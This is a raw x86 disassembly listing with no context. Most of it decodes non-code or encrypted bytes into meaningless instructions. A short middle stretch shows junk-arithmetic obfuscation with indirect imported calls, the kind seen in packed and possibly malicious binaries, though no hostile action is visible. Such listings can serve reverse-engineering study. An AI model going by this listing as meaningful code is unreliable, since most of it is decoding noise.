  406abe:	sub    al,BYTE PTR [ecx-0x7ef2039c]
  406ac4:	cli    
  406ac5:	push   cs
  406ac6:	fwait
  406ac7:	aam    0x10
  406ac9:	aas    
  406aca:	dec    ecx
  406acb:	mov    ?,WORD PTR [esi+edi*8]
  406ace:	aam    0x4
  406ad0:	or     dl,cl
  406ad2:	test   DWORD PTR [edx+0x5bb3e151],edx
  406ad8:	xchg   ebp,eax
  406ad9:	and    edi,ebx
  406adb:	pop    ebp
  406adc:	scas   eax,DWORD PTR es:[edi]
  406add:	loopne 0x406b0c
  406adf:	jle    0x406b57
  406ae1:	push   ebx
  406ae2:	pop    ebx
  406ae3:	mov    ah,0x48
  406ae5:	rcl    BYTE PTR [esi-0x5d],0x99
  406ae9:	or     ebx,DWORD PTR [edx+ecx*2-0x67]
  406aed:	out    dx,eax
  406aee:	das    
  406aef:	inc    ebp
  406af0:	pop    esi
  406af1:	hlt    
  406af2:	xor    dl,bh
  406af4:	ret    0xc9de
  406af7:	int    0x6e
  406af9:	sbb    BYTE PTR cs:[esi-0x3086e3e4],bl
  406b00:	and    eax,DWORD PTR [edx-0x40]
  406b03:	imul   esi,DWORD PTR [edi-0xc],0xc64de373
  406b0a:	jae    0x406b3d
  406b0c:	sbb    BYTE PTR ds:0x3802911b,0xb1
  406b13:	sub    eax,0x3990b73b
  406b18:	jnp    0x406b60
  406b1a:	cmp    eax,0xd37f98a8
  406b1f:	call   0x4b03:0x10f2adee
  406b26:	mov    esi,0x7cf02cfb
  406b2b:	mov    ah,0xd2
  406b2d:	lods   eax,DWORD PTR ds:[esi]
  406b2e:	and    BYTE PTR [edi],cl
  406b30:	push   0xffffffdb
  406b32:	jg     0x406ad9
  406b34:	mov    esp,DWORD PTR [ebx+0x69668072]
  406b3a:	lds    ebx,FWORD PTR [edx]
  406b3c:	adc    ebp,DWORD PTR [esi+ebp*8+0x6f]
  406b40:	fcom   QWORD PTR [ecx-0x2dbec4bb]
  406b47:	pop    ss
  406b48:	(bad)  
  406b4a:	loop   0x406b3b
  406b4c:	mov    ah,0xbe
  406b4e:	ret    
  406b4f:	jp     0x406bb7
  406b51:	dec    edi
  406b52:	add    BYTE PTR [ebp+0x54],dl
  406b55:	xor    al,0x3b
  406b57:	mov    BYTE PTR fs:[edx-0x49],0x21
  406b5c:	int3   
  406b5d:	mov    bl,0x62
  406b5f:	mov    ebp,0x892f3823
  406b64:	inc    ebx
  406b65:	push   cs
  406b66:	sub    BYTE PTR [edx],dl
  406b68:	fisub  WORD PTR [esi]
  406b6a:	push   cs
  406b6b:	(bad)  
  406b6d:	shl    DWORD PTR [eax+0x4f],0xd1
  406b71:	mov    bl,0x54
  406b73:	outs   dx,DWORD PTR ds:[esi]
  406b74:	iret   
  406b75:	(bad)  
  406b76:	add    eax,0x2d8c6324
  406b7b:	(bad)  
  406b7c:	rcl    BYTE PTR [ebx],0x3c
  406b7f:	xchg   esi,eax
  406b80:	mov    dh,0xa0
  406b82:	(bad)  [eax+0x46]
  406b85:	out    0xbd,al
  406b87:	int3   
  406b88:	xor    eax,esp
  406b8a:	adc    DWORD PTR [ecx-0x49],0x4353ed68
  406b91:	cmp    eax,0xd969952e
  406b96:	imul   esp,DWORD PTR [eax],0x74c02099
  406b9c:	jmp    0x406bb9
  406b9e:	retf   0xa0aa
  406ba1:	push   ecx
  406ba2:	pop    esi
  406ba3:	jae    0x406c1e
  406ba5:	push   ds
  406ba6:	paddq  mm1,QWORD PTR [ecx]
  406ba9:	cmp    DWORD PTR [esi-0x6d],edx
  406bac:	xor    BYTE PTR [eax-0x4ce92df],ch
  406bb2:	xor    ebx,esp
  406bb4:	inc    ebp
  406bb5:	cmp    eax,0xf49442dd
  406bba:	imul   ebx,ebx,0x2fd7136c
  406bc0:	xchg   ebp,eax
  406bc1:	mov    edx,0x191c2064
  406bc7:	pop    es
  406bc8:	or     eax,esi
  406bca:	rcr    BYTE PTR [ecx-0x42],1
  406bcd:	and    dl,BYTE PTR [edx+0x43]
  406bd0:	fisttp WORD PTR ds:0xea451bbb
  406bd6:	scas   eax,DWORD PTR es:[edi]
  406bd7:	dec    esi
  406bd8:	lea    edi,[ebx]
  406bda:	push   ds
  406bdb:	add    BYTE PTR [ecx+0x33],ch
  406bde:	dec    esi
  406bdf:	out    0xaa,al
  406be1:	dec    ecx
  406be2:	ins    BYTE PTR es:[edi],dx
  406be3:	add    DWORD PTR [esi+0x30e0f112],ebp
  406be9:	dec    DWORD PTR [esi-0x478d7261]
  406bef:	or     DWORD PTR [edx-0x4f],0x57
  406bf3:	addr16 js 0x406c34
  406bf6:	xchg   ebp,eax
  406bf7:	lea    esp,[ebx+0x7c0272f5]
  406bfd:	mov    edi,0xae3b91d8
  406c02:	mov    edx,0x8001e708
  406c07:	adc    esi,DWORD PTR [ecx+esi*4-0x48]
  406c0b:	mov    BYTE PTR [esp+esi*2+0x7e],dh
  406c0f:	push   ebp
  406c10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c11:	sbb    al,0x9a
  406c13:	or     edi,ecx
  406c15:	scas   al,BYTE PTR es:[edi]
  406c16:	fwait
  406c17:	push   ds
  406c18:	push   ebp
  406c19:	std    
  406c1a:	xchg   ebx,eax
  406c1b:	pop    ebp
  406c1c:	test   eax,0x400b3f00
  406c21:	adc    al,0x0
  406c23:	popf   
  406c24:	std    
  406c25:	push   cs
  406c26:	loope  0x406bac
  406c28:	cmp    BYTE PTR [edx+0x4660ba38],ah
  406c2e:	or     BYTE PTR [edi+0xd790c58],bl
  406c34:	test   eax,0x70e7bc9a
  406c39:	in     eax,0xfa
  406c3b:	add    BYTE PTR [edx+ebp*1],ch
  406c3e:	stc    
  406c3f:	int    0xca
  406c41:	sub    eax,0x3ec05de0
  406c46:	bound  eax,QWORD PTR [ebx-0x2f]
  406c49:	sbb    bh,0xba
  406c4c:	hlt    
  406c4d:	cmc    
  406c4e:	fwait
  406c4f:	fs ins BYTE PTR es:[edi],dx
  406c51:	(bad)  
  406c52:	into   
  406c53:	stc    
  406c54:	stos   DWORD PTR es:[edi],eax
  406c55:	vxorpd ymm7,ymm7,YMMWORD PTR [ebp-0x39952ed2]
  406c5d:	mov    ch,0x36
  406c5f:	xor    al,0x9a
  406c61:	jns    0x406c74
  406c63:	add    ebp,DWORD PTR [esp+ebp*2]
  406c66:	push   edi
  406c67:	lods   eax,DWORD PTR ds:[esi]
  406c68:	jg     0x406cd2
  406c6a:	add    al,0xa0
  406c6c:	pop    ss
  406c6d:	sub    bh,BYTE PTR ds:0xc05c1f72
  406c73:	inc    ebx
  406c74:	sbb    al,BYTE PTR [ecx-0x5a7c08cc]
  406c7a:	inc    eax
  406c7b:	addr16 mov esp,0xfb0904a7
  406c81:	xchg   DWORD PTR [esi-0x54],eax
  406c84:	das    
  406c85:	adc    DWORD PTR [ebx-0x7b],esi
  406c88:	neg    DWORD PTR [edi-0x68c2e0ef]
  406c8e:	inc    eax
  406c8f:	aaa    
  406c90:	jle    0x406c37
  406c92:	inc    esp
  406c93:	jecxz  0x406c53
  406c95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c96:	test   al,0x6e
  406c98:	xchg   eax,esp
  406c9a:	aaa    
  406c9b:	out    dx,al
  406c9c:	ins    DWORD PTR es:[edi],dx
  406c9d:	ret    
  406c9e:	outs   dx,BYTE PTR ds:[esi]
  406c9f:	lods   eax,DWORD PTR ds:[esi]
  406ca0:	pop    ds
  406ca1:	mov    bh,0x80
  406ca3:	scas   eax,DWORD PTR es:[edi]
  406ca4:	push   ebx
  406ca5:	dec    eax
  406ca6:	(bad)  
  406ca7:	jg     0x406cb9
  406ca9:	gs push 0x5b2cdb2e
  406caf:	ror    BYTE PTR [ebp+0x7d],cl
  406cb2:	inc    ecx
  406cb3:	dec    ecx
  406cb4:	sbb    DWORD PTR fs:[ebp+0x13],edx
  406cb8:	jg     0x406ce3
  406cba:	lods   eax,DWORD PTR ds:[esi]
  406cbb:	stos   BYTE PTR es:[edi],al
  406cbc:	dec    ebp
  406cbd:	xchg   esp,eax
  406cbe:	sbb    BYTE PTR [edi-0x18],ah
  406cc1:	popf   
  406cc2:	daa    
  406cc3:	and    DWORD PTR [edi-0x688074c9],edi
  406cc9:	pop    ds
  406cca:	mov    cl,0xf1
  406ccc:	xchg   esp,eax
  406ccd:	jmp    0x406cad
  406ccf:	sub    eax,0xfc0d39cf
  406cd4:	mov    DWORD PTR [ecx],esi
  406cd6:	xor    al,0xaf
  406cd8:	xchg   BYTE PTR [ebp+0x7cf64793],dh
  406cde:	fbstp  TBYTE PTR [esi]
  406ce0:	ret    
  406ce1:	add    DWORD PTR [eax+0x23],ebp
  406ce4:	push   ds
  406ce5:	pop    esi
  406ce6:	mov    eax,0x6c1ba6a0
  406ceb:	sub    DWORD PTR [edi+0x71],ebx
  406cee:	imul   esi,DWORD PTR [edx+0x10c4ca81],0xa190f13e
  406cf8:	mov    eax,0x9d87793c
  406cfd:	outs   dx,DWORD PTR ds:[esi]
  406cfe:	cmc    
  406cff:	jne    0x406cf0
  406d01:	add    ebx,DWORD PTR [edi-0x80d59ab]
  406d07:	mov    esp,0x94fd5aaa
  406d0c:	shr    DWORD PTR [esi-0x5cea2bad],cl
  406d12:	mov    ebx,0x4b5b1ff1
  406d17:	outs   dx,BYTE PTR ds:[esi]
  406d18:	dec    eax
  406d19:	jge    0x406d1f
  406d1b:	das    
  406d1c:	xchg   ebp,eax
  406d1d:	not    ebx
  406d1f:	pop    eax
  406d20:	push   edi
  406d21:	sub    dh,BYTE PTR [esi]
  406d23:	add    ch,BYTE PTR [eax+0x58]
  406d26:	and    ch,dl
  406d28:	mov    BYTE PTR [edx+0x193f4547],cl
  406d2e:	adc    eax,DWORD PTR [ebp-0x2a]
  406d31:	pop    edi
  406d32:	fwait
  406d33:	jns    0x406d8e
  406d35:	xchg   ebp,eax
  406d36:	add    esp,DWORD PTR [eax]
  406d38:	inc    eax
  406d39:	add    eax,0xb0b1be69
  406d3e:	outs   dx,DWORD PTR ds:[esi]
  406d3f:	and    ah,bl
  406d41:	cmp    BYTE PTR [eax+0x6d],dh
  406d44:	dec    edx
  406d45:	or     edi,DWORD PTR [edx]
  406d47:	and    edi,DWORD PTR [ecx-0x20ac5950]
  406d4d:	or     esp,edi
  406d4f:	push   ss
  406d50:	dec    esp
  406d51:	in     eax,dx
  406d52:	jb     0x406cf4
  406d54:	les    edi,FWORD PTR [ecx+0x7dcd247d]
  406d5a:	push   0x2b410487
  406d5f:	loop   0x406dcb
  406d61:	lods   al,BYTE PTR ds:[esi]
  406d62:	ja     0x406d8d
  406d64:	adc    ch,BYTE PTR [ecx+0x7b]
  406d67:	sub    esi,ecx
  406d69:	inc    ecx
  406d6a:	clc    
  406d6b:	(bad)
  406d6f:	jge    0x406db4
  406d71:	into   
  406d72:	stos   DWORD PTR es:[edi],eax
  406d73:	int    0x3
  406d75:	xchg   ebx,eax
  406d76:	cmp    ebx,DWORD PTR [edx]
  406d78:	pusha  
  406d79:	jge    0x406d20
  406d7b:	push   es
  406d7c:	sbb    cl,ah
  406d7e:	jb     0x406d99
  406d80:	ins    DWORD PTR es:[edi],dx
  406d81:	jge    0x406de2
  406d83:	into   
  406d84:	add    esp,DWORD PTR [esp+ebp*2+0x558fa31e]
  406d8b:	and    DWORD PTR [esp+ebx*8+0x3c],eax
  406d8f:	and    al,0x82
  406d91:	repz ret 
  406d93:	ret    0xa691
  406d96:	(bad)  
  406d97:	(bad)  
  406d98:	adc    ch,BYTE PTR ds:[eax]
  406d9b:	mov    ebp,0xf16bf543
  406da0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406da1:	in     al,0xa9
  406da3:	and    BYTE PTR [eax],al
  406da5:	sbb    al,0xf
  406da7:	int3   
  406da8:	push   cs
  406da9:	in     al,dx
  406daa:	add    eax,0x35ae8233
  406daf:	test   al,0x1f
  406db1:	inc    esi
  406db2:	mov    eax,0xb81fa043
  406db7:	xor    DWORD PTR ds:0x7ccf8b07,0xfdc361f8
  406dc1:	fwait
  406dc2:	retf   
  406dc3:	mov    bl,0x83
  406dc5:	lahf   
  406dc6:	xor    DWORD PTR ds:0x4293d656,esi
  406dcc:	push   ebx
  406dcd:	ins    DWORD PTR es:[edi],dx
  406dce:	outs   dx,BYTE PTR ds:[esi]
  406dcf:	jnp    0x406d7e
  406dd1:	push   0xd0bd446c
  406dd6:	mov    dh,al
  406dd8:	xor    cl,BYTE PTR [edi-0x14]
  406ddb:	sahf   
  406ddc:	push   0x27
  406dde:	xlat   BYTE PTR ds:[ebx]
  406ddf:	jecxz  0x406d8e
  406de1:	fwait
  406de2:	pop    esp
  406de3:	push   esp
  406de4:	shl    BYTE PTR [esi],1
  406de6:	cdq    
  406de7:	inc    edi
  406de8:	pop    ebx
  406de9:	ror    DWORD PTR [edi-0x3e],cl
  406dec:	inc    edx
  406ded:	fwait
  406dee:	and    BYTE PTR [esi+edx*8-0x72],dh
  406df2:	test   DWORD PTR [esi],ebp
  406df4:	mov    ds:0x7e8544db,al
  406df9:	jmp    0x19896ed
  406dfe:	mov    es,WORD PTR [eax-0x57e1f885]
  406e04:	jmp    0x406d8c
  406e06:	daa    
  406e07:	xchg   edx,eax
  406e08:	sub    DWORD PTR [eax],ebp
  406e0a:	pop    ss
  406e0b:	mov    ebx,0xf0effddf
  406e10:	mov    ss,WORD PTR [edx-0x38]
  406e13:	mov    edx,0xf71a5848
  406e18:	pop    edx
  406e19:	(bad)  
  406e1a:	xchg   edx,eax
  406e1b:	fmulp  st(7),st
  406e1d:	inc    edx
  406e1e:	inc    ebx
  406e1f:	aaa    
  406e20:	and    DWORD PTR [eax+0x719ee194],esi
  406e26:	cli    
  406e27:	sbb    eax,0xfba6a1ea
  406e2c:	sti    
  406e2d:	cmp    dl,ah
  406e2f:	xor    dh,BYTE PTR [ebx+0x642b2e61]
  406e35:	mov    esi,0x962b8c23
  406e3a:	data16 bnd jne 0x406eb0
  406e3e:	cli    
  406e3f:	(bad)  
  406e40:	je     0x406e79
  406e42:	cmp    eax,0xb2776f7b
  406e47:	repz fs pop ebx
  406e4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e4b:	ja     0x406de2
  406e4d:	xchg   edi,eax
  406e4e:	jae    0x406eac
  406e50:	xor    BYTE PTR [ebp+0x702871a4],dh
  406e56:	pusha  
  406e57:	and    esi,DWORD PTR [ecx-0x62]
  406e5a:	jmp    0xa4d79721
  406e5f:	(bad)  
  406e60:	aad    0x12
  406e62:	fcmovnbe st,st(2)
  406e64:	stc    
  406e65:	dec    eax
  406e66:	inc    eax
  406e67:	addr16 ret 0x674b
  406e6b:	cmp    dh,0x5b
  406e6e:	enter  0x387c,0x48
  406e72:	sbb    bh,BYTE PTR [esi-0x18ebdd7c]
  406e78:	stc    
  406e79:	scas   al,BYTE PTR es:[edi]
  406e7a:	push   cs
  406e7b:	std    
  406e7c:	cs jae 0x406e7b
  406e7f:	dec    ebx
  406e80:	push   0xc7614f4b
  406e85:	cmp    eax,0x533ee7d9
  406e8a:	mov    dh,bh
  406e8c:	into   
  406e8d:	loope  0x406e8e
  406e8f:	fnstcw WORD PTR [eax]
  406e91:	push   esi
  406e92:	push   ebp
  406e93:	and    al,0x3
  406e95:	jle    0x406ea7
  406e97:	ins    DWORD PTR es:[edi],dx
  406e98:	cli    
  406e99:	cwde   
  406e9a:	inc    edx
  406e9b:	stos   BYTE PTR es:[edi],al
  406e9c:	(bad)  
  406e9e:	call   0x3cb2:0x3f7e68ef
  406ea5:	jl     0x406e4b
  406ea7:	add    ecx,DWORD PTR [ebp+0x7f4c9d8c]
  406ead:	jl     0x406ef3
  406eaf:	retf   
  406eb0:	fisttp WORD PTR ds:0x6784c86
  406eb6:	dec    edi
  406eb7:	push   edx
  406eb8:	push   esi
  406eb9:	ror    BYTE PTR [edi-0x2c4cfede],cl
  406ebf:	call   0x6a5:0xb1e09d50
  406ec6:	push   ds
  406ec7:	jns    0x406f25
  406ec9:	jo     0x406e75
  406ecb:	nop
  406ecc:	in     al,0xe5
  406ece:	fsubr  QWORD PTR [ecx-0x1f]
  406ed1:	repz popf 
  406ed3:	adc    DWORD PTR [ebp+0x2e],eax
  406ed6:	cmp    BYTE PTR [ebx-0x30039a67],0x3a
  406edd:	pop    ecx
  406ede:	mov    ecx,0x1d8b2d03
  406ee3:	nop
  406ee4:	dec    esi
  406ee5:	stc    
  406ee6:	and    BYTE PTR [esi],ah
  406ee8:	(bad)  
  406ee9:	jno    0x406ed0
  406eeb:	lahf   
  406eec:	call   0xe7f391b1
  406ef1:	add    ebp,DWORD PTR [edx-0x7d]
  406ef4:	mov    edi,0x92da76cc
  406ef9:	mov    ds:0x15038b27,eax
  406efe:	mov    DWORD PTR [ebx-0x1b],esi
  406f01:	inc    ebx
  406f02:	mov    ecx,0x2a3cac43
  406f07:	add    BYTE PTR [esi-0x17f88f3a],0x55
  406f0e:	or     ebp,DWORD PTR [ecx+0x62]
  406f11:	or     esp,DWORD PTR [esi+0x45ea43f5]
  406f17:	in     al,0x4
  406f19:	cmp    edi,ebx
  406f1b:	sahf   
  406f1c:	dec    ebp
  406f1d:	das    
  406f1e:	and    al,0xa8
  406f20:	pop    eax
  406f21:	pushf  
  406f22:	add    ah,0x34
  406f25:	sbb    esi,DWORD PTR [esi+0x702f76d4]
  406f2b:	dec    ecx
  406f2c:	sbb    al,0x1d
  406f2e:	adc    esp,edi
  406f30:	xor    DWORD PTR ds:0x2012b293,eax
  406f36:	retf   
  406f37:	mov    edi,0x5cda6c41
  406f3c:	jns    0x406f11
  406f3e:	adc    eax,0x769ff1f7
  406f43:	inc    edx
  406f44:	adc    eax,0x794be029
  406f49:	(bad)  
  406f4a:	jo     0x406fbc
  406f4c:	mov    esi,0x7189d82b
  406f51:	jecxz  0x406f50
  406f53:	dec    edx
  406f54:	lods   al,BYTE PTR ds:[esi]
  406f55:	mov    WORD PTR [eax],gs
  406f57:	hlt    
  406f58:	mov    fs,eax
  406f5a:	mov    al,0x97
  406f5c:	cmp    al,0x7a
  406f5e:	out    0x8e,al
  406f60:	(bad)  
  406f61:	arpl   WORD PTR [edi+edx*2+0xd27f9b7],sp
  406f68:	bound  esi,QWORD PTR [ecx-0x7b]
  406f6b:	ret    
  406f6c:	jns    0x406fd3
  406f6e:	and    DWORD PTR [eax+0x79],edi
  406f71:	icebp  
  406f72:	data16 stos BYTE PTR es:[edi],al
  406f74:	add    eax,0xde6ceaa
  406f79:	dec    eax
  406f7a:	cmp    BYTE PTR [esi-0x10a854e0],bl
  406f80:	sub    dh,BYTE PTR [edi]
  406f82:	dec    ebx
  406f83:	test   eax,ecx
  406f85:	and    al,0x63
  406f87:	add    edi,DWORD PTR ds:[eax-0x2d9698a9]
  406f8e:	and    al,0x1b
  406f90:	pop    ebx
  406f91:	pop    ss
  406f92:	sub    BYTE PTR [eax-0x3932b7fa],bh
  406f98:	(bad)  
  406f99:	test   DWORD PTR [ebx+ebp*8],0x7080e200
  406fa0:	mov    al,BYTE PTR [ebp-0x1e3eb543]
  406fa6:	push   ds
  406fa7:	xor    ecx,ecx
  406fa9:	xor    DWORD PTR ds:0x4229ba,0x4229a2
  406fb3:	or     ecx,DWORD PTR [ebp-0x1c]
  406fb6:	shr    edx,0x2
  406fb9:	xor    edx,DWORD PTR ds:0x422892
  406fbf:	mov    edx,DWORD PTR [esi+0x4]
  406fc2:	mov    DWORD PTR [ebp-0x2c],ecx
  406fc5:	cmp    DWORD PTR ds:0x422992,0x0
  406fcc:	mov    DWORD PTR ds:0x4228ee,0x4f9e
  406fd6:	mov    edx,0x30c0
  406fdb:	mov    edx,DWORD PTR ds:0x422936
  406fe1:	jmp    0x407022
  406fe6:	mov    DWORD PTR ds:0x42296a,0x6ad7
  406ff0:	je     0x407011
  406ff6:	push   0x592a
  406ffb:	call   DWORD PTR ds:0x42a018
  407001:	xor    edx,edx
  407003:	or     edx,DWORD PTR ds:0x4228b6
  407009:	xor    DWORD PTR ds:0x42294a,edx
  40700f:	add    ecx,edx
  407011:	inc    ecx
  407012:	or     ecx,0x572d
  407018:	adc    DWORD PTR ds:0x422992,0x6861
  407022:	mov    ecx,DWORD PTR [ebp+0x18]
  407025:	cmp    DWORD PTR ds:0x422966,0x0
  40702c:	mov    DWORD PTR ds:0x42299a,0x24bb
  407036:	mov    DWORD PTR ds:0x422992,0x4860
  407040:	jmp    0x4070fc
  407045:	mov    DWORD PTR ds:0x4228ea,0x356f
  40704f:	jle    0x407079
  407055:	push   DWORD PTR [ebp-0x18]
  407058:	push   0x5570
  40705d:	push   0x150b
  407062:	push   0x5476
  407067:	push   0x7791
  40706c:	push   0x2991
  407071:	call   DWORD PTR ds:0x42a01c
  407077:	inc    edx
  407078:	dec    edx
  407079:	sbb    DWORD PTR ds:0x4229c6,0x42296e
  407083:	sub    edx,DWORD PTR ds:0x422926
  407089:	cmp    DWORD PTR ds:0x4228d6,0x0
  407090:	mov    edx,DWORD PTR ds:0x422952
  407096:	mov    edx,0x5ca6
  40709b:	not    edx
  40709d:	jmp    0x4070fc
  4070a2:	mov    DWORD PTR ds:0x4228f6,0x627
  4070ac:	jae    0x4070d8
  4070b2:	push   0x5b8a
  4070b7:	push   0x190e
  4070bc:	call   DWORD PTR ds:0x42a2a0
  4070c2:	add    DWORD PTR ds:0x42297a,edi
  4070c8:	xor    DWORD PTR ds:0x42293a,edi
  4070ce:	and    DWORD PTR ds:0x4229b2,0x7045
  4070d8:	sbb    DWORD PTR ds:0x4228f6,0x244f
  4070e2:	adc    DWORD PTR ds:0x4229a2,ebx
  4070e8:	xor    edx,edx
  4070ea:	xor    edx,DWORD PTR ds:0x42296e
  4070f0:	add    edx,DWORD PTR ds:0x422986
  4070f6:	mov    DWORD PTR ds:0x42296e,edx
  4070fc:	mov    edx,DWORD PTR [ebp+0x1c]
  4070ff:	shrd   ecx,edx,0x2
  407103:	add    DWORD PTR ds:0x4229be,0x1936
  40710d:	jmp    0x407697
  407112:	loope  0x4070db
  407114:	ja     0x407111
  407116:	xor    DWORD PTR [edx],ebx
  407118:	pusha  
  407119:	pushf  
  40711a:	sub    DWORD PTR [edi],esp
  40711c:	scas   al,BYTE PTR es:[edi]
  40711d:	jb     0x4070a8
  40711f:	and    DWORD PTR [esi],ebx
  407121:	test   al,0xc9
  407123:	ins    DWORD PTR es:[edi],dx
  407124:	push   ss
  407125:	push   ss
  407126:	cmp    eax,0x11161604
  40712b:	xor    ecx,ebp
  40712d:	pop    ds
  40712e:	enter  0xd51e,0x75
  407132:	add    al,0x99
  407134:	push   ecx
  407135:	test   al,0x16
  407137:	sub    al,0x41
  407139:	inc    edi
  40713a:	xchg   ebx,eax
  40713b:	outs   dx,DWORD PTR ds:[esi]
  40713c:	sub    bh,BYTE PTR [esi]
  40713e:	pusha  
  40713f:	aam    0xdb
  407141:	sub    esp,esp
  407143:	pop    ecx
  407144:	pop    esi
  407145:	loop   0x4070d6
  407147:	sbb    BYTE PTR [edx-0x5c],dl
  40714a:	xor    eax,0xaed69478
  40714f:	add    edi,DWORD PTR [ecx+0x6c5c1e5c]
  407155:	jmp    0xa1844b11
  40715a:	adc    al,0xab
  40715c:	xchg   edi,eax
  40715d:	lahf   
  40715e:	iret   
  40715f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407160:	and    BYTE PTR [ecx-0x26140d9a],dh
  407166:	std    
  407167:	and    BYTE PTR [ebx-0x58982baa],0x2f
  40716e:	pop    esp
  40716f:	pop    ds
  407170:	mov    ecx,0x7fd320fa
  407175:	test   BYTE PTR [ebp+0x7e],al
  407178:	cdq    
  407179:	loop   0x40718e
  40717b:	add    bh,BYTE PTR [ecx+0xb]
  40717e:	push   esp
  407180:	int3   
  407181:	xor    eax,0x1c376beb
  407186:	retf   0xd699
  407189:	xchg   DWORD PTR ds:0x89b87455,ecx
  40718f:	(bad)  
  407190:	jo     0x407210
  407192:	mov    dh,0x4d
  407194:	int3   
  407195:	xor    esp,DWORD PTR [ebp+ecx*8+0x4ba11081]
  40719c:	pop    edi
  40719d:	sbb    DWORD PTR [eax+0x77],ecx
  4071a0:	adc    BYTE PTR fs:[esi+0x3d],al
  4071a4:	dec    eax
  4071a5:	add    BYTE PTR [edx+ebp*2],bl
  4071a8:	sbb    edx,edi
  4071aa:	add    dl,BYTE PTR [ebx+0x44475f7d]
  4071b0:	dec    eax
  4071b1:	add    DWORD PTR [ecx],ebp
  4071b3:	push   edx
  4071b4:	push   ss
  4071b5:	wrmsr  
  4071b7:	pop    cx
  4071b9:	jb     0x40715b
  4071bb:	popf   
  4071bc:	mov    ds:0xc0d6b126,al
  4071c1:	xchg   edi,eax
  4071c2:	and    ecx,DWORD PTR [edx-0x53]
  4071c5:	inc    esi
  4071c6:	mov    dh,0xed
  4071c8:	das    
  4071c9:	push   ebp
  4071ca:	jmp    0x9b34:0xa89dc392
  4071d1:	ins    BYTE PTR es:[edi],dx
  4071d2:	jle    0x4071f8
  4071d4:	add    eax,0x2f25f9b8
  4071d9:	sbb    al,0xd0
  4071dc:	mov    DWORD PTR [ecx+0x3d84537c],edi
  4071e2:	es sbb eax,0x79ce0477
  4071e8:	out    0x67,eax
  4071ea:	xchg   ecx,eax
  4071eb:	pushf  
  4071ec:	push   es
  4071ed:	shl    BYTE PTR [eax],0xf2
  4071f0:	js     0x4071e6
  4071f2:	push   edx
  4071f3:	imul   esp,DWORD PTR [edi],0xffffffbb
  4071f6:	test   eax,ebp
  4071f8:	or     ecx,DWORD PTR [edi]
  4071fa:	mov    dh,dl
  4071fc:	je     0x407241
  4071fe:	xor    eax,0xa42c958e
  407203:	nop
  407204:	hlt    
  407205:	bound  ebp,QWORD PTR [ecx+0x4c]
  407208:	cld    
  407209:	inc    esp
  40720a:	or     BYTE PTR [ebx-0x63],al
  40720d:	adc    edx,esp
  40720f:	jle    0x407261
  407211:	jp     0x407194
  407213:	cld    
  407214:	scas   al,BYTE PTR es:[edi]
  407215:	add    al,BYTE PTR [ebx-0x4a]
  407218:	aam    0x67
  40721a:	mov    eax,0xd262a94a
  40721f:	pop    es
  407220:	mov    ebp,es
  407222:	into   
  407223:	out    dx,al
  407224:	xchg   DWORD PTR [ebp+0x7dc3a6c5],edi
  40722a:	fs popa 
  40722c:	sub    eax,edi
  40722e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40722f:	inc    DWORD PTR [ecx]
  407231:	loop   0x4071e9
  407233:	sbb    al,0x21
  407235:	mul    BYTE PTR [ecx+ebx*4-0x3e171f1c]
  40723c:	dec    eax
  40723d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40723e:	pop    esp
  40723f:	clc    
  407240:	test   al,0x15
  407242:	sub    edx,DWORD PTR [esi+0x5e7453f6]
  407248:	cs mov al,0x98
  40724b:	add    dl,bh
  40724d:	or     eax,0x6c9add6e
  407252:	imul   ebx,DWORD PTR [edx-0x41c93f60],0xffffffd8
  407259:	gs inc esp
  40725b:	xor    BYTE PTR [ecx-0x77e8ab77],bh
  407261:	mov    ds,WORD PTR [esi]
  407263:	(bad)  
  407265:	xchg   esi,eax
  407266:	sbb    ebp,eax
  407268:	xchg   ebx,eax
  407269:	push   ebp
  40726a:	xchg   DWORD PTR ds:0x609c1903,edi
  407270:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407271:	pop    ds
  407272:	popf   
  407273:	mov    dh,0xaa
  407275:	nop
  407276:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407277:	cmc    
  407278:	leave  
  407279:	fwait
  40727a:	pusha  
  40727b:	fist   DWORD PTR [ecx+esi*8+0x0]
  40727f:	call   0x52c9:0x8ea8068c
  407286:	xchg   edi,eax
  407287:	fld    TBYTE PTR [eax+0x6]
  40728a:	les    edi,FWORD PTR [edi+0x2a]
  40728d:	mov    esp,0xd4354ee6
  407292:	push   es
  407293:	mov    esp,0x48585099
  407298:	in     eax,0x70
  40729a:	push   cs
  40729b:	xor    ah,BYTE PTR [eax+ebp*4+0x5a04e9a8]
  4072a2:	push   0xffffff86
  4072a4:	push   cs
  4072a5:	jmp    0x407253
  4072a7:	jge    0x4072ad
  4072a9:	xchg   BYTE PTR [ecx],dh
  4072ab:	mov    bh,0x10
  4072ad:	int3   
  4072ae:	lds    edx,FWORD PTR [ebx-0x4ee3c399]
  4072b4:	pop    ebp
  4072b5:	or     eax,0x5d67e750
  4072ba:	(bad)  [esi]
  4072bc:	xchg   esp,eax
  4072bd:	shr    DWORD PTR [edx],cl
  4072bf:	mov    al,0x2c
  4072c1:	or     BYTE PTR [eax],bh
  4072c3:	sbb    eax,0x2c6f2d6f
  4072c8:	xchg   esp,eax
  4072c9:	lock cmp al,0xb4
  4072cc:	mov    edi,0x2107a020
  4072d1:	sub    al,0x73
  4072d3:	lea    ebp,[ebx+0x4ed01dd8]
  4072d9:	scas   eax,DWORD PTR es:[edi]
  4072da:	mov    bh,0xa0
  4072dc:	sub    al,cl
  4072de:	pop    eax
  4072df:	(bad)  [edi-0x4b43cc39]
  4072e5:	dec    esp
  4072e6:	xchg   BYTE PTR [edx],bh
  4072e8:	lds    ecx,FWORD PTR [ebx-0x6f]
  4072eb:	mov    WORD PTR [ebp-0x28],?
  4072ee:	sub    ecx,DWORD PTR [ecx+0x1d]
  4072f1:	aas    
  4072f2:	xchg   edx,eax
  4072f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4072f4:	or     DWORD PTR [eax+0x5c1d3222],ecx
  4072fa:	pop    ebp
  4072fb:	sbb    DWORD PTR [edi+0x1e],0x96146198
  407302:	(bad)  
  407304:	add    BYTE PTR [edi+0x13],dh
  407307:	jle    0x4072c7
